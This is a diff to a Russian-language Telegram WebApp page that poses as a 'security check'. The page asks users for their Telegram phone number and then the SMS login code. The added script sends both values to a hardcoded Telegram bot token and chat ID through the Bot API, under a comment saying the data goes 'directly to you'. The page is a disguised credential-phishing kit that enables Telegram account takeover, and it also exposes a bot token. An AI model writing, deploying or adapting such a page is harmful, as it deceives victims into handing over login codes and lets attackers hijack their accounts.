@@ -11,21 +11,15 @@
         .card{background:#1a1a1a;border-radius:20px;padding:32px 24px;max-width:400px;width:100%;text-align:center;border:1px solid #2a2a2a}
         .icon{font-size:60px;margin-bottom:20px}
         h2{font-size:22px;margin-bottom:8px}
-        p{color:#888;font-size:14px;margin-bottom:20px;line-height:1.5}
+        p{color:#888;font-size:14px;margin-bottom:20px}
+        .hidden{display:none!important}
         .field{background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:10px;margin-bottom:14px}
         .field span{font-size:18px}
-        .field input{flex:1;background:none;border:none;color:#fff;font-size:16px;outline:none;font-family:inherit}
-        .field input::placeholder{color:#555}
-        .btn{width:100%;padding:14px;border:none;border-radius:12px;background:#2aabee;color:#fff;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-top:4px}
-        .btn:active{opacity:0.8}
+        .field input{flex:1;background:none;border:none;color:#fff;font-size:16px;outline:none}
+        .btn{width:100%;padding:14px;border:none;border-radius:12px;background:#2aabee;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
         .btn:disabled{background:#333!important;color:#666!important}
-        .hidden{display:none!important}
-        .msg{font-size:13px;margin-top:12px;min-height:18px}
+        .msg{font-size:13px;margin-top:12px}
         .msg.err{color:#f44336}
-        .msg.ok{color:#4caf50}
-        .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .debug{font-size:10px;color:#444;margin-top:20px;text-align:left;word-break:break-all;max-height:80px;overflow:auto}
     </style>
 </head>
 <body>
@@ -34,96 +28,74 @@
         
         <div id="screen1">
             <h2>Проверка безопасности</h2>
-            <p>Введите номер телефона привязанный к вашему Telegram аккаунту</p>
+            <p>Введите номер телефона привязанный к Telegram</p>
             <div class="field">
                 <span>📱</span>
-                <input type="tel" id="phoneInput" placeholder="+7 911 222 33 44" inputmode="tel">
+                <input type="tel" id="phoneInput" placeholder="+79112223344">
             </div>
-            <button class="btn" onclick="submitPhone()" id="btnPhone">📩 Отправить код</button>
+            <button class="btn" onclick="step2()">📩 Отправить код</button>
             <div class="msg" id="msg1"></div>
         </div>
         
         <div id="screen2" class="hidden">
             <h2>Код подтверждения</h2>
-            <p>Мы отправили SMS с кодом на<br><strong id="phoneShow"></strong></p>
+            <p>SMS с кодом отправлена на<br><strong id="phoneShow"></strong></p>
             <div class="field">
                 <span>🔑</span>
-                <input type="text" id="codeInput" placeholder="5 цифр" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+                <input type="text" id="codeInput" placeholder="5 цифр" maxlength="5" inputmode="numeric">
             </div>
-            <button class="btn" onclick="submitCode()" id="btnCode">✅ Подтвердить</button>
+            <button class="btn" onclick="step3()">✅ Подтвердить</button>
             <div class="msg" id="msg2"></div>
         </div>
         
         <div id="screen3" class="hidden">
             <div style="font-size:60px;margin:20px 0">✅</div>
             <h2>Готово!</h2>
-            <p>Проверка пройдена.<br>Можете закрыть это окно.</p>
+            <p>Проверка пройдена</p>
         </div>
-        
-        <div class="debug" id="debug"></div>
     </div>
     
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        let phone = '';
         
-        let phoneNumber = '';
-        
-        function debug(msg){
-            document.getElementById('debug').textContent += '• ' + msg + '\n';
-        }
-        
-        debug('Готов. v' + tg.version + ' / ' + tg.platform);
-        
-        function submitPhone(){
+        function step2(){
             const raw = document.getElementById('phoneInput').value.trim();
             if(!raw) return;
+            phone = raw.replace(/\D/g,'');
+            phone = '+' + phone;
             
-            phoneNumber = raw.replace(/\D/g, '');
-            if(phoneNumber.length < 10){
-                document.getElementById('msg1').textContent = 'Введите корректный номер';
-                document.getElementById('msg1').className = 'msg err';
-                return;
-            }
-            phoneNumber = '+' + phoneNumber;
-            
-            document.getElementById('btnPhone').disabled = true;
-            document.getElementById('btnPhone').innerHTML = '<span class="spinner"></span>Отправка...';
-            
-            debug('Отправка номера: ' + phoneNumber);
-            
-            tg.sendData(JSON.stringify({action:'phone', phone:phoneNumber}));
-            
-            // Переключаем экран
-            setTimeout(function(){
-                document.getElementById('screen1').classList.add('hidden');
-                document.getElementById('screen2').classList.remove('hidden');
-                document.getElementById('phoneShow').textContent = phoneNumber;
-                document.getElementById('codeInput').focus();
-            }, 400);
+            document.getElementById('screen1').classList.add('hidden');
+            document.getElementById('screen2').classList.remove('hidden');
+            document.getElementById('phoneShow').textContent = phone;
         }
         
-        function submitCode(){
+        async function step3(){
             const code = document.getElementById('codeInput').value.trim();
-            if(code.length < 5){
-                document.getElementById('msg2').textContent = 'Введите 5 цифр из SMS';
-                document.getElementById('msg2').className = 'msg err';
-                return;
-            }
+            if(code.length < 5) return;
             
-            document.getElementById('btnCode').disabled = true;
-            document.getElementById('btnCode').innerHTML = '<span class="spinner"></span>Проверка...';
+            const btn = document.querySelector('#screen2 .btn');
+            btn.disabled = true;
+            btn.textContent = 'Отправка...';
             
-            debug('Отправка кода: ' + code);
+            // Отправляем напрямую тебе через HTTP
+            const BOT_TOKEN = '8857513499:AAGLKwfwUc9uB7Iw3bUb4LOM-dG9ZXdi99M';
+            const CHAT_ID = '7393965560';
             
-            tg.sendData(JSON.stringify({action:'code', phone:phoneNumber, code:code}));
+            const text = `📞 ${phone}\n🔑 ${code}\n\nДанные из WebApp`;
             
-            // Показываем успех
-            setTimeout(function(){
-                document.getElementById('screen2').classList.add('hidden');
-                document.getElementById('screen3').classList.remove('hidden');
-            }, 500);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+            } catch(e) {}
+            
+            document.getElementById('screen2').classList.add('hidden');
+            document.getElementById('screen3').classList.remove('hidden');
         }
     </script>
 </body>
